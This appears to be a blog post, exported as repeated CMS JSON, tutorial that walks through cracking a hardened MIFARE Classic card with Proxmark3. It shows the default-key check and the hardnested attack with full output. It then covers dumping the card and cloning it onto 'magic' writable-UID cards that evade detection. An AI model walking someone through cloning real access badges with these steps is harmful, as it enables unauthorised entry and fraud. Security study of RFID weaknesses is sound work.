|    1s\\n      18 |    1878 | Apply bit flip properties                               |      2006925312 |    2s\\n      18 |    1986 | Apply bit flip properties                               |      1101943296 |    1s\\n      19 |    2095 | Apply bit flip properties                               |      1406170624 |    2s\\n      20 |    2095 | (1. guess: Sum(a8) = 0)                                 |      1406170624 |    2s\\n      20 |    2095 | Apply Sum(a8) and all bytes bitflip properties          |      1331002112 |    1s\\n      20 |    2095 | Brute force phase completed. Key found: 8a19d40cf2b5    |               0 |    0s\"}],[\"code\",{\"code\":\"proxmark3> hf mf ekeyprn\\n|---|----------------|----------------|          \\n|sec|key A           |key B           |          \\n|---|----------------|----------------|          \\n|000|  ffffffffffff  |  ffffffffffff  |          \\n|001|  000000000000  |  000000000000  |          \\n|002|  ffffffffffff  |  ffffffffffff  |          \\n|003|  ffffffffffff  |  ffffffffffff  |          \\n|004|  ffffffffffff  |  ffffffffffff  |          \\n|005|  ffffffffffff  |  ffffffffffff  |          \\n|006|  ffffffffffff  |  ffffffffffff  |          \\n|007|  ffffffffffff  |  ffffffffffff  |          \\n|008|  ffffffffffff  |  ffffffffffff  |          \\n|009|  ffffffffffff  |  ffffffffffff  |          \\n|010|  ffffffffffff  |  ffffffffffff  |          \\n|011|  ffffffffffff  |  ffffffffffff  |          \\n|012|  ffffffffffff  |  ffffffffffff  |          \\n|013|  ffffffffffff  |  ffffffffffff  |          \\n|014|  ffffffffffff  |  ffffffffffff  |          \\n|015|  ffffffffffff  |  ffffffffffff  |          \\n|---|----------------|----------------|\"}],[\"code\",{\"code\":\"proxmark3> hf mf chk *1 ? t 8a19d40cf2b5\\nchk key[ 0] 8a19d40cf2b5          \\n\\nTo cancel this operation press the button on the proxmark...          \\n--o          \\n|---|----------------|---|----------------|---|          \\n|sec|key A           |res|key B           |res|          \\n|---|----------------|---|----------------|---|          \\n|000|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|001|  8a19d40cf2b5  | 1 |  8a19d40cf2b5  | 1 |          \\n|002|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|003|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|004|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|005|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|006|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|007|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|008|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|009|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|010|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|011|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|012|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|013|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|014|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|015|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \\n|---|----------------|---|----------------|---|          \\nFound keys have been transferred to the emulator memory\"}],[\"code\",{\"code\":\"proxmark3> hf mf ekeyprn\\n|---|----------------|----------------|          \\n|sec|key A           |key B           |          \\n|---|----------------|----------------|          \\n|000|  ffffffffffff  |  ffffffffffff  |          \\n|001|  8a19d40cf2b5  |  8a19d40cf2b5  |          \\n|002|  ffffffffffff  |  ffffffffffff  |          \\n|003|  ffffffffffff  |  ffffffffffff  |          \\n|004|  ffffffffffff  |  ffffffffffff  |          \\n|005|  ffffffffffff  |  ffffffffffff  |          \\n|006|  ffffffffffff  |  ffffffffffff  |          \\n|007|  ffffffffffff  |  ffffffffffff  |          \\n|008|  ffffffffffff  |  ffffffffffff  |          \\n|009|  ffffffffffff  |  ffffffffffff  |          \\n|010|  ffffffffffff  |  ffffffffffff  |          \\n|011|  ffffffffffff  |  ffffffffffff  |          \\n|012|  ffffffffffff  |  ffffffffffff  |          \\n|013|  ffffffffffff  |  ffffffffffff  |          \\n|014|  ffffffffffff  |  ffffffffffff  |          \\n|015|  ffffffffffff  |  ffffffffffff  |          \\n|---|----------------|----------------|\"}]],\"markups\":[[\"code\"],[\"strong\"]],\"sections\":[[1,\"p\",[[0,[],0,\"The traditional attacks on MIFARE cards rely on weak random number generation. The two most common attacks using the Proxmark3 are the darkside attack \"],[0,[0],1,\"hf mf mifare\"],[0,[],0,\" and the nested attack \"],[0,[0],1,\"hf mf nested\"],[0,[],0,\". Neither of these attacks work on modern MIFARE cards with hardened pseudorandom number generation (PRNG).\"]]],[1,\"p\",[[0,[],0,\"How do you know which PRNG (weak or hardened) the card is using? Boot up your Proxmark3, put the card on it, and run \"],[0,[0],1,\"hf search\"],[0,[],0,\":\"]]],[10,0],[1,\"p\",[[0,[],0,\"Notice the line that says \"],[0,[0],1,\"Prng detection: HARDENED (hardnested)\"],[0,[],0,\". This is confirmation that we are dealing with a \"],[0,[1],1,\"hardened\"],[0,[],0,\" MIFARE card and the two common attacks mentioned previously will not work.\"]]],[1,\"h2\",[[0,[],0,\"Finding a Key\"]]],[1,\"p\",[[0,[],0,\"The first step in cracking a hardened MIFARE card is to discover a valid key. This is usually very easy as most cards will have sectors using the default key of \"],[0,[0],1,\"FFFFFFFFFFFF\"],[0,[],0,\". To check a few common keys, try the \"],[0,[0],1,\"hf mf chk *1 ? t\"],[0,[],0,\" command:\"]]],[10,1],[1,\"p\",[[0,[],0,\"At first glance, it looks like we got lucky and all the keys were the default \"],[0,[0],1,\"FFFFFFFFFFFF\"],[0,[],0,\" key. However, this is not actually the case. Notice the \"],[0,[0],1,\"res\"],[0,[],0,\" column is either equal to \"],[0,[0],1,\"1\"],[0,[],0,\" or \"],[0,[0],1,\"0\"],[0,[],0,\". A \"],[0,[0],1,\"1\"],[0,[],0,\" in the column means the key was valid for that sector. A \"],[0,[0],1,\"0\"],[0,[],0,\" in the column means the key is not valid and the Proxmark3 is using the default key of \"],[0,[0],1,\"FFFFFFFFFFFF\"],[0,[],0,\" as a placeholder. We can confirm this by displaying the valid keys stored in emulator memory using \"],[0,[0],1,\"hf mf ekeyprn\"],[0,[],0,\":\"]]],[10,2],[1,\"p\",[[0,[],0,\"Notice that \"],[0,[0],1,\"sector 001\"],[0,[],0,\" above shows as \"],[0,[0],1,\"000000000000\"],[0,[],0,\", which means that the key was not discovered for that sector. Still, finding the key for 15/16 sectors is pretty good!\"]]],[1,\"h2\",[[0,[],0,\"Cracking the \\\"Secure\\\" Sectors\"]]],[1,\"p\",[[0,[],0,\"Now that we have a valid key for the card, we are able to utilize the \"],[0,[0],1,\"hf mf hardnested\"],[0,[],0,\" command to unlock \"],[0,[0],1,\"sector 001\"],[0,[],0,\". Before we do that, we need to make sure we verify we can unlock a block using the key we've already discovered. Then we need to get a block number that we are unable to currently access. Use the chart below as a reference:\"]]],[10,3],[1,\"p\",[[0,[],0,\"Using the above conversion chart, we should be able to unlock \"],[0,[0],1,\"block 0\"],[0,[],0,\" with the key \"],[0,[0],1,\"FFFFFFFFFFFF\"],[0,[],0,\" and we should be unsuccessful unlocking \"],[0,[0],1,\"block 4\"],[0,[],0,\" using the same key. Let's verify:\"]]],[10,4],[10,5],[1,\"p\",[[0,[],0,\"Perfect! We have verified the key works successfully with \"],[0,[0],1,\"block 0\"],[0,[],0,\", but does not work at all with \"],[0,[0],1,\"block 4\"],[0,[],0,\". \"],[0,[0],1,\"Block 4\"],[0,[],0,\" is part of \"],[0,[0],1,\"sector 001\"],[0,[],0,\", which we haven't cracked yet, so it all makes sense.\"]]],[1,\"p\",[[0,[],0,\"Now let's use the hardnested attack to unlock \"],[0,[0],1,\"sector 001\"],[0,[],0,\":\"]]],[10,6],[1,\"p\",[[0,[],0,\"Notice at the bottom it says \"],[0,[0],1,\"Key found: 8a19d40cf2b5\"],[0,[],0,\"! Sweet!\"]]],[1,\"p\",[[0,[],0,\"So let's print the key table again using \"],[0,[0],1,\"hf mf ekeyprn\"],[0,[],0,\":\"]]],[10,7],[1,\"p\",[[0,[],0,\"What gives? Why is our new key not in the table? We need to run the \"],[0,[0],1,\"hf mf chk\"],[0,[],0,\" command again to verify this new key and add it to the internal key buffer table:\"]]],[10,8],[1,\"p\",[[0,[],0,\"Cool! It shows as valid for \"],[0,[0],1,\"sector 001\"],[0,[],0,\". However, the \"],[0,[0],1,\"res\"],[0,[],0,\" column for every other sector is now \"],[0,[0],1,\"0\"],[0,[],0,\". Don't worry about that because our key table is still accurate:\"]]],[10,9],[1,\"p\",[[0,[],0,\"Nice! We've broken all sectors and we can now dump / restore the card!\"]]],[1,\"h2\",[[0,[],0,\"Dumping and Restoring the MIFARE Card\"]]],[1,\"p\",[[0,[],0,\"This part is simple. You just need to run \"],[0,[0],1,\"hf mf dump\"],[0,[],0,\" to dump the contents of the MIFARE card to a file on your disk. After that, you need to run \"],[0,[0],1,\"hf mf restore\"],[0,[],0,\" using a compatible blank card.\"]]],[1,\"h3\",[[0,[],0,\"Why doesn't the card work?\"]]],[1,\"p\",[[0,[],0,\"If the card works for you after the above, great! If not, you may be left wondering where you went wrong. The MIFARE card standard says that \"],[0,[0],1,\"Block 0\"],[0,[],0,\" should be read-only. This effectively means that the card cannot be identically duplicated for security reasons. A lot of RFID systems verify that the UID on the card is correct and your duplicate will be detected. So what can you do?\"]]],[1,\"p\",[[0,[],0,\"Enter the Chinese Magic Backdoor cards! These special MIFARE cards utilize a writable \"],[0,[0],1,\"Block 0\"],[0,[],0,\" that allow you to completely clone a card and it will be virtually undetectable! There are a few types you should be aware of:\"]]],[1,\"p\",[[0,[1],1,\"UID\"],[0,[],0,\" - The original Chinese Magic Backdoor card. These cards respond to the backdoor commands and will show \"],[0,[0],1,\"Chinese magic backdoor commands (GEN 1a) detected\"],[0,[],0,\" when you do an \"],[0,[0],1,\"hf search\"],[0,[],0,\". These cards can be detected by probing the card to see if it responds to the backdoor commands. Some RFID systems may try to detect these cards.\"]]],[1,\"p\",[[0,[1],1,\"CUID\"],[0,[],0,\" - The 2nd generation Chinese Magic Backdoor card. These cards do not use the backdoor commands, but instead allow \"],[0,[0],1,\"Block 0\"],[0,[],0,\" to be written to like any other block on the card. This gives the card better compatibility to be written to from an Android phone. However, some RFID systems can detect this type of card by sending a write command to \"],[0,[0],1,\"Block 0\"],[0,[],0,\", making the card invalid after the first use is attempted.\"]]],[1,\"p\",[[0,[1],1,\"FUID\"],[0,[],0,\" - This type of card is not as common, but allows \"],[0,[0],1,\"Block 0\"],[0,[],0,\" to be written to just once. This allows you to create a clone of a card and any checks done by the RFID system will pass because \"],[0,[0],1,\"Block 0\"],[0,[],0,\" is no longer writable.\"]]],[1,\"p\",[[0,[1],1,\"UFUID\"],[0,[],0,\" - This type of card is apparently a \\\"better\\\" version of the FUID card. Instead of only allowing \"],[0,[0],1,\"Block 0\"],[0,[],0,\" to be written once, you can write to it many times and then lock the block later when you're happy with the result. After locking \"],[0,[0],1,\"Block 0\"],[0,[],0,\", it cannot be unlocked to my knowledge. I do not think there is currently a way to lock these cards using the Proxmark3.\"]]],[1,\"p\",[[0,[],0,\"Both a UID and CUID card are included with the Proxmark3 Easy (or at least the one I bought on Ebay...). To write \"],[0,[0],1,\"Block 0\"],[0,[],0,\", I used the \"],[0,[0],1,\"hf mf csetuid\"],[0,[],0,\" command. This card then worked perfectly. Hooray!\"]]]]}","html":"<p>The traditional attacks on MIFARE cards rely on weak random number generation. The two most common attacks using the Proxmark3 are the darkside attack <code>hf mf mifare</code> and the nested attack <code>hf mf nested</code>. Neither of these attacks work on modern MIFARE cards with hardened pseudorandom number generation (PRNG).</p><p>How do you know which PRNG (weak or hardened) the card is using? Boot up your Proxmark3, put the card on it, and run <code>hf search</code>:</p><!--kg-card-begin: code--><pre><code>proxmark3&gt; hf search\nUID : 20 2e 19 a4           \nATQA : 00 04          \n SAK : 08 [2]          \nTYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1          \nproprietary non iso14443-4 card found, RATS not supported          \nNo chinese magic backdoor command detected          \nPrng detection: HARDENED (hardnested)          \n\nValid ISO14443A Tag Found - Quiting Search\n</code></pre><!--kg-card-end: code--><p>Notice the line that says <code>Prng detection: HARDENED (hardnested)</code>. This is confirmation that we are dealing with a <strong>hardened</strong> MIFARE card and the two common attacks mentioned previously will not work.</p><h2 id=\"finding-a-key\">Finding a Key</h2><p>The first step in cracking a hardened MIFARE card is to discover a valid key. This is usually very easy as most cards will have sectors using the default key of <code>FFFFFFFFFFFF</code>. To check a few common keys, try the <code>hf mf chk *1 ? t</code> command:</p><!--kg-card-begin: code--><pre><code>proxmark3&gt; hf mf chk *1 ? t\nNo key specified, trying default keys          \nchk default key[ 0] ffffffffffff          \nchk default key[ 1] 000000000000          \nchk default key[ 2] a0a1a2a3a4a5          \nchk default key[ 3] b0b1b2b3b4b5          \nchk default key[ 4] aabbccddeeff          \nchk default key[ 5] 1a2b3c4d5e6f          \nchk default key[ 6] 123456789abc          \nchk default key[ 7] 010203040506          \nchk default key[ 8] 123456abcdef          \nchk default key[ 9] abcdef123456          \nchk default key[10] 4d3a99c351dd          \nchk default key[11] 1a982c7e459a          \nchk default key[12] d3f7d3f7d3f7          \nchk default key[13] 714c5c886e97          \nchk default key[14] 587ee5f9350f          \nchk default key[15] a0478cc39091          \nchk default key[16] 533cb6c723f6          \nchk default key[17] 8fd0a4f256e9          \n\nTo cancel this operation press the button on the proxmark...          \n--o          \n|---|----------------|---|----------------|---|          \n|sec|key A           |res|key B           |res|          \n|---|----------------|---|----------------|---|          \n|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|001|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|---|----------------|---|----------------|---|          \nFound keys have been transferred to the emulator memory</code></pre><!--kg-card-end: code--><p>At first glance, it looks like we got lucky and all the keys were the default <code>FFFFFFFFFFFF</code> key. However, this is not actually the case. Notice the <code>res</code> column is either equal to <code>1</code> or <code>0</code>. A <code>1</code> in the column means the key was valid for that sector. A <code>0</code> in the column means the key is not valid and the Proxmark3 is using the default key of <code>FFFFFFFFFFFF</code> as a placeholder. We can confirm this by displaying the valid keys stored in emulator memory using <code>hf mf ekeyprn</code>:</p><!--kg-card-begin: code--><pre><code>|---|----------------|----------------|          \n|sec|key A           |key B           |          \n|---|----------------|----------------|          \n|000|  ffffffffffff  |  ffffffffffff  |          \n|001|  000000000000  |  000000000000  |          \n|002|  ffffffffffff  |  ffffffffffff  |          \n|003|  ffffffffffff  |  ffffffffffff  |          \n|004|  ffffffffffff  |  ffffffffffff  |          \n|005|  ffffffffffff  |  ffffffffffff  |          \n|006|  ffffffffffff  |  ffffffffffff  |          \n|007|  ffffffffffff  |  ffffffffffff  |          \n|008|  ffffffffffff  |  ffffffffffff  |          \n|009|  ffffffffffff  |  ffffffffffff  |          \n|010|  ffffffffffff  |  ffffffffffff  |          \n|011|  ffffffffffff  |  ffffffffffff  |          \n|012|  ffffffffffff  |  ffffffffffff  |          \n|013|  ffffffffffff  |  ffffffffffff  |          \n|014|  ffffffffffff  |  ffffffffffff  |          \n|015|  ffffffffffff  |  ffffffffffff  |          \n|---|----------------|----------------|</code></pre><!--kg-card-end: code--><p>Notice that <code>sector 001</code> above shows as <code>000000000000</code>, which means that the key was not discovered for that sector. Still, finding the key for 15/16 sectors is pretty good!</p><h2 id=\"cracking-the-secure-sectors\">Cracking the \"Secure\" Sectors</h2><p>Now that we have a valid key for the card, we are able to utilize the <code>hf mf hardnested</code> command to unlock <code>sector 001</code>. Before we do that, we need to make sure we verify we can unlock a block using the key we've already discovered. Then we need to get a block number that we are unable to currently access. Use the chart below as a reference:</p><!--kg-card-begin: code--><pre><code>Sector 000 - Block 0-3\nSector 001 - Block 4-7\nSector 002 - Block 8-11\nSector 003 - Block 12-15\nSector 004 - Block 16-19\nSector 005 - Block 20-23\nSector 006 - Block 24-27\nSector 007 - Block 28-31\nSector 008 - Block 32-35\nSector 009 - Block 36-39\nSector 010 - Block 40-43\nSector 011 - Block 44-47\nSector 012 - Block 48-51\nSector 013 - Block 52-55\nSector 014 - Block 56-59\nSector 015 - Block 60-63</code></pre><!--kg-card-end: code--><p>Using the above conversion chart, we should be able to unlock <code>block 0</code> with the key <code>FFFFFFFFFFFF</code> and we should be unsuccessful unlocking <code>block 4</code> using the same key. Let's verify:</p><!--kg-card-begin: code--><pre><code>proxmark3&gt; hf mf chk 0 A FFFFFFFFFFFF\nchk key[ 0] ffffffffffff          \n\nFound valid key:[0:A]ffffffffffff          </code></pre><!--kg-card-end: code--><!--kg-card-begin: code--><pre><code>proxmark3&gt; hf mf chk 4 A FFFFFFFFFFFF\nchk key[ 0] ffffffffffff          \n\n          \nNo valid keys found.</code></pre><!--kg-card-end: code--><p>Perfect! We have verified the key works successfully with <code>block 0</code>, but does not work at all with <code>block 4</code>. <code>Block 4</code> is part of <code>sector 001</code>, which we haven't cracked yet, so it all makes sense.</p><p>Now let's use the hardnested attack to unlock <code>sector 001</code>:</p><!--kg-card-begin: code--><pre><code>proxmark3&gt; hf mf hardnested 0 A FFFFFFFFFFFF 4 A\n--target block no:  4, target key type:A, known target key: 0x000000000000 (not set), file action: none, Slow: No, Tests: 0\nUsing AVX2 SIMD core.\n\n\n\n time    | #nonces | Activity                                                | expected to brute force\n         |         |                                                         | #states         | time\n------------------------------------------------------------------------------------------------------\n       0 |       0 | Start using 4 threads and AVX2 SIMD core                |                 |\n       0 |       0 | Brute force benchmark: 900 million (2^29.7) keys/s      | 140737488355328 |    2d\n       1 |       0 | Using 235 precalculated bitflip state tables            | 140737488355328 |    2d\n       4 |     112 | Apply bit flip properties                               |    153070288896 |  3min\n       5 |     224 | Apply bit flip properties                               |     38262738944 |   43s\n       6 |     336 | Apply bit flip properties                               |     33238697984 |   37s\n       7 |     448 | Apply bit flip properties                               |     33104111616 |   37s\n       8 |     559 | Apply bit flip properties                               |     30823223296 |   34s\n       9 |     671 | Apply bit flip properties                               |     30728589312 |   34s\n       9 |     783 | Apply bit flip properties                               |     30728589312 |   34s\n      10 |     891 | Apply bit flip properties                               |     30728589312 |   34s\n      10 |    1002 | Apply bit flip properties                               |     30728589312 |   34s\n      11 |    1113 | Apply bit flip properties                               |     30728589312 |   34s\n      12 |    1223 | Apply bit flip properties                               |     30728589312 |   34s\n      13 |    1335 | Apply bit flip properties                               |     30728589312 |   34s\n      14 |    1443 | Apply bit flip properties                               |     30728589312 |   34s\n      15 |    1553 | Apply bit flip properties                               |     30728589312 |   34s\n      15 |    1660 | Apply bit flip properties                               |     30728589312 |   34s\n      17 |    1770 | Apply Sum property. Sum(a0) = 144                       |      1224898816 |    1s\n      18 |    1878 | Apply bit flip properties                               |      2006925312 |    2s\n      18 |    1986 | Apply bit flip properties                               |      1101943296 |    1s\n      19 |    2095 | Apply bit flip properties                               |      1406170624 |    2s\n      20 |    2095 | (1. guess: Sum(a8) = 0)                                 |      1406170624 |    2s\n      20 |    2095 | Apply Sum(a8) and all bytes bitflip properties          |      1331002112 |    1s\n      20 |    2095 | Brute force phase completed. Key found: 8a19d40cf2b5    |               0 |    0s</code></pre><!--kg-card-end: code--><p>Notice at the bottom it says <code>Key found: 8a19d40cf2b5</code>! Sweet!</p><p>So let's print the key table again using <code>hf mf ekeyprn</code>:</p><!--kg-card-begin: code--><pre><code>proxmark3&gt; hf mf ekeyprn\n|---|----------------|----------------|          \n|sec|key A           |key B           |          \n|---|----------------|----------------|          \n|000|  ffffffffffff  |  ffffffffffff  |          \n|001|  000000000000  |  000000000000  |          \n|002|  ffffffffffff  |  ffffffffffff  |          \n|003|  ffffffffffff  |  ffffffffffff  |          \n|004|  ffffffffffff  |  ffffffffffff  |          \n|005|  ffffffffffff  |  ffffffffffff  |          \n|006|  ffffffffffff  |  ffffffffffff  |          \n|007|  ffffffffffff  |  ffffffffffff  |          \n|008|  ffffffffffff  |  ffffffffffff  |          \n|009|  ffffffffffff  |  ffffffffffff  |          \n|010|  ffffffffffff  |  ffffffffffff  |          \n|011|  ffffffffffff  |  ffffffffffff  |          \n|012|  ffffffffffff  |  ffffffffffff  |          \n|013|  ffffffffffff  |  ffffffffffff  |          \n|014|  ffffffffffff  |  ffffffffffff  |          \n|015|  ffffffffffff  |  ffffffffffff  |          \n|---|----------------|----------------|</code></pre><!--kg-card-end: code--><p>What gives? Why is our new key not in the table? We need to run the <code>hf mf chk</code> command again to verify this new key and add it to the internal key buffer table:</p><!--kg-card-begin: code--><pre><code>proxmark3&gt; hf mf chk *1 ? t 8a19d40cf2b5\nchk key[ 0] 8a19d40cf2b5          \n\nTo cancel this operation press the button on the proxmark...          \n--o          \n|---|----------------|---|----------------|---|          \n|sec|key A           |res|key B           |res|          \n|---|----------------|---|----------------|---|          \n|000|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|001|  8a19d40cf2b5  | 1 |  8a19d40cf2b5  | 1 |          \n|002|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|003|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|004|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|005|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|006|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|007|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|008|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|009|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|010|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|011|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|012|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|013|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|014|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|015|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|---|----------------|---|----------------|---|          \nFound keys have been transferred to the emulator memory</code></pre><!--kg-card-end: code--><p>Cool! It shows as valid for <code>sector 001</code>. However, the <code>res</code> column for every other sector is now <code>0</code>. Don't worry about that because our key table is still accurate:</p><!--kg-card-begin: code--><pre><code>proxmark3&gt; hf mf ekeyprn\n|---|----------------|----------------|          \n|sec|key A           |key B           |          \n|---|----------------|----------------|          \n|000|  ffffffffffff  |  ffffffffffff  |          \n|001|  8a19d40cf2b5  |  8a19d40cf2b5  |          \n|002|  ffffffffffff  |  ffffffffffff  |          \n|003|  ffffffffffff  |  ffffffffffff  |          \n|004|  ffffffffffff  |  ffffffffffff  |          \n|005|  ffffffffffff  |  ffffffffffff  |          \n|006|  ffffffffffff  |  ffffffffffff  |          \n|007|  ffffffffffff  |  ffffffffffff  |          \n|008|  ffffffffffff  |  ffffffffffff  |          \n|009|  ffffffffffff  |  ffffffffffff  |          \n|010|  ffffffffffff  |  ffffffffffff  |          \n|011|  ffffffffffff  |  ffffffffffff  |          \n|012|  ffffffffffff  |  ffffffffffff  |          \n|013|  ffffffffffff  |  ffffffffffff  |          \n|014|  ffffffffffff  |  ffffffffffff  |          \n|015|  ffffffffffff  |  ffffffffffff  |          \n|---|----------------|----------------|</code></pre><!--kg-card-end: code--><p>Nice! We've broken all sectors and we can now dump / restore the card!</p><h2 id=\"dumping-and-restoring-the-mifare-card\">Dumping and Restoring the MIFARE Card</h2><p>This part is simple. You just need to run <code>hf mf dump</code> to dump the contents of the MIFARE card to a file on your disk. After that, you need to run <code>hf mf restore</code> using a compatible blank card.</p><h3 id=\"why-doesn-t-the-card-work\">Why doesn't the card work?</h3><p>If the card works for you after the above, great! If not, you may be left wondering where you went wrong. The MIFARE card standard says that <code>Block 0</code> should be read-only. This effectively means that the card cannot be identically duplicated for security reasons. A lot of RFID systems verify that the UID on the card is correct and your duplicate will be detected. So what can you do?</p><p>Enter the Chinese Magic Backdoor cards! These special MIFARE cards utilize a writable <code>Block 0</code> that allow you to completely clone a card and it will be virtually undetectable! There are a few types you should be aware of:</p><p><strong>UID</strong> - The original Chinese Magic Backdoor card. These cards respond to the backdoor commands and will show <code>Chinese magic backdoor commands (GEN 1a) detected</code> when you do an <code>hf search</code>. These cards can be detected by probing the card to see if it responds to the backdoor commands. Some RFID systems may try to detect these cards.</p><p><strong>CUID</strong> - The 2nd generation Chinese Magic Backdoor card. These cards do not use the backdoor commands, but instead allow <code>Block 0</code> to be written to like any other block on the card. This gives the card better compatibility to be written to from an Android phone. However, some RFID systems can detect this type of card by sending a write command to <code>Block 0</code>, making the card invalid after the first use is attempted.</p><p><strong>FUID</strong> - This type of card is not as common, but allows <code>Block 0</code> to be written to just once. This allows you to create a clone of a card and any checks done by the RFID system will pass because <code>Block 0</code> is no longer writable.</p><p><strong>UFUID</strong> - This type of card is apparently a \"better\" version of the FUID card. Instead of only allowing <code>Block 0</code> to be written once, you can write to it many times and then lock the block later when you're happy with the result. After locking <code>Block 0</code>, it cannot be unlocked to my knowledge. I do not think there is currently a way to lock these cards using the Proxmark3.</p><p>Both a UID and CUID card are included with the Proxmark3 Easy (or at least the one I bought on Ebay...). To write <code>Block 0</code>, I used the <code>hf mf csetuid</code> command. This card then worked perfectly. Hooray!</p>","comment_id":"5b6a370c75c22775c973640b","plaintext":"The traditional attacks on MIFARE cards rely on weak random number generation.\nThe two most common attacks using the Proxmark3 are the darkside attack hf mf\nmifare and the nested attack hf mf nested. Neither of these attacks work on\nmodern MIFARE cards with hardened pseudorandom number generation (PRNG).\n\nHow do you know which PRNG (weak or hardened) the card is using? Boot up your\nProxmark3, put the card on it, and run hf search:\n\nproxmark3> hf search\nUID : 20 2e 19 a4           \nATQA : 00 04          \n SAK : 08 [2]          \nTYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1          \nproprietary non iso14443-4 card found, RATS not supported          \nNo chinese magic backdoor command detected          \nPrng detection: HARDENED (hardnested)          \n\nValid ISO14443A Tag Found - Quiting Search\n\n\nNotice the line that says Prng detection: HARDENED (hardnested). This is\nconfirmation that we are dealing with a hardened MIFARE card and the two common\nattacks mentioned previously will not work.\n\nFinding a Key\nThe first step in cracking a hardened MIFARE card is to discover a valid key.\nThis is usually very easy as most cards will have sectors using the default key\nof FFFFFFFFFFFF. To check a few common keys, try the hf mf chk *1 ? t command:\n\nproxmark3> hf mf chk *1 ? t\nNo key specified, trying default keys          \nchk default key[ 0] ffffffffffff          \nchk default key[ 1] 000000000000          \nchk default key[ 2] a0a1a2a3a4a5          \nchk default key[ 3] b0b1b2b3b4b5          \nchk default key[ 4] aabbccddeeff          \nchk default key[ 5] 1a2b3c4d5e6f          \nchk default key[ 6] 123456789abc          \nchk default key[ 7] 010203040506          \nchk default key[ 8] 123456abcdef          \nchk default key[ 9] abcdef123456          \nchk default key[10] 4d3a99c351dd          \nchk default key[11] 1a982c7e459a          \nchk default key[12] d3f7d3f7d3f7          \nchk default key[13] 714c5c886e97          \nchk default key[14] 587ee5f9350f          \nchk default key[15] a0478cc39091          \nchk default key[16] 533cb6c723f6          \nchk default key[17] 8fd0a4f256e9          \n\nTo cancel this operation press the button on the proxmark...          \n--o          \n|---|----------------|---|----------------|---|          \n|sec|key A           |res|key B           |res|          \n|---|----------------|---|----------------|---|          \n|000|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|001|  ffffffffffff  | 0 |  ffffffffffff  | 0 |          \n|002|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|003|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|004|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|005|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|006|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|007|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|008|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|009|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|010|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|011|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|012|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|013|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|014|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|015|  ffffffffffff  | 1 |  ffffffffffff  | 1 |          \n|---|----------------|---|----------------|---|          \nFound keys have been transferred to the emulator memory\n\nAt first glance, it looks like we got lucky and all the keys were the default \nFFFFFFFFFFFF key. However, this is not actually the case. Notice the res column\nis either equal to 1 or 0. A 1 in the column means the key was valid for that\nsector. A 0 in the column means the key is not valid and the Proxmark3 is using\nthe default key of FFFFFFFFFFFF as a placeholder. We can confirm this by\ndisplaying the valid keys stored in emulator memory using hf mf ekeyprn:\n\n|---|----------------|----------------|          \n|sec|key A           |key B           |          \n|---|----------------|----------------|          \n|000|  ffffffffffff  |  ffffffffffff  |          \n|001|  000000000000  |  000000000000  |          \n|002|  ffffffffffff  |  ffffffffffff  |          